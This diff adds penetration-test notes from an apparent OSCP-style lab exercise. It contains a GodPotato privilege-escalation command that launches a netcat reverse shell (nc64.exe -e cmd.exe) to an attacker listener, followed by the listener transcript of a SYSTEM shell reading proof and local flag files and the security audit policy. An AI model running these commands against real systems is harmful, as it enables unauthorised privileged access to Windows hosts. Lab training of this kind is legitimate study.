@@ -1,0 +1,45 @@
+# On Kali
+#   nc -lvnp 4448
+# On the target, triggered over ESL:
+#   C:\Users\chris\AppData\Local\Temp\GodPotato-NET4.exe -cmd "C:\Users\chris\AppData\Local\Temp\nc64.exe -e cmd.exe 192.168.45.158 4448"
+#
+# Raw listener transcript (blank lines collapsed):
+
+listening on [any] 4448 ...
+connect to [192.168.45.158] from (UNKNOWN) [192.168.137.151] 51358
+Microsoft Windows [Version 10.0.19043.2130]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
+type C:\Users\Administrator\Desktop\proof.txt
+46586fc8f483adc13d76335768bf0a4c
+
+C:\Windows\system32>echo USER=%USERNAME% DOM=%USERDOMAIN%
+echo USER=%USERNAME% DOM=%USERDOMAIN%
+USER=OSCP$ DOM=WORKGROUP
+
+C:\Windows\system32>whoami & hostname & reg query HKLM\SECURITY\Policy\PolAdtEv
+whoami & hostname & reg query HKLM\SECURITY\Policy\PolAdtEv
+OSCP
+
+HKEY_LOCAL_MACHINE\SECURITY\Policy\PolAdtEv
+    (Default)    REG_NONE    0001000009000000840000000100000003000000030003000100010000000100000000000000030000000000000
+000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100010000000000000000000100000
+00100000000000000000000000000000000000000000000006F0A05000B000E00030006000600060004000400
+
+
+C:\Windows\system32>
+
+# Second shell, used for local.txt (chapter 06):
+# on [any] 4450 ...
+# connect to [192.168.45.158] from (UNKNOWN) [192.168.137.151] 51386
+# C:\Windows\system32>dir /b C:\Users\chris\Desktop & echo --- & type C:\Users\chris\Desktop\local.txt & echo --- & ver
+local.txt
+---
+9d05eefc0447258ceab32e91e3b54aac
+---
+
+Microsoft Windows [Version 10.0.19043.2130]
+---
+
+C:\Windows\system32>
